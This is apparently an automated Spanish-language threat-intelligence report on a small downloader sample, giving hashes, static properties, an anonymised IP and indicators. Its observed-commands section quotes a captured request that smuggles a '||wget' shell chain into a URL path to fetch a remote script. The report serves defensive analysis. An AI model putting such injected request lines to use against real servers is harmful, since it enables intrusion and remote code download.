# 🧬 Payload Analysis

`6d992e411d1ce96a8f8ad880fcabf32ee95b376b1343e47c977588b05f18b60b`

## 📌 Resumen

Texto ASCII de 158 B. La evidencia disponible identifica capacidad de descarga remota. **Comandos observados o extraídos, en orden de aparición en la evidencia:**

1. `wget` Los comandos se presentan como evidencia observada o extraída; no se afirma ejecución salvo que la relación registrada sea `executed`. **Ficha malware:** [malware-like/oraculo/downloader/6d992e411d1ce96a8f8ad880fcabf32ee95b376b1343e47c977588b05f18b60b.md](../../../../../malware-like/oraculo/downloader/6d992e411d1ce96a8f8ad880fcabf32ee95b376b1343e47c977588b05f18b60b.md)


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:38:58.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `6d992e411d1ce96a8f8ad880fcabf32ee95b376b1343e47c977588b05f18b60b`
- **MD5:** `fde65e6bff147d5749f7d34b572038cc`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with CRLF line terminators |
| Tamaño | 158 B |
| Entropía | 5.19 |
| Strings | 6 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Ejecución**

## 🔬 Evidencia de clasificación

- Motivos técnicos: mime=ASCII text, with CRLF line terminators; iocs=4

## 🖥️ Comandos observados / extraídos

```text
GET /rondo.%5Cbmv.sh%7C%7Cwget HTTP/1.1
User-Agent: curl/7.73.0
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| ip | 45.153.34.XXX | static_analysis |
| command | GET /rondo.%5Cbmv.sh%7C%7Cwget HTTP/1.1 | strings |
| command | User-Agent: curl/7.73.0 | strings |
| hash | 6d992e411d1ce96a8f8ad880fcabf32ee95b376b1343e47c977588b05f18b60b | static_analysis |
| ip | [internal-ip-redacted] | artifact_source |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
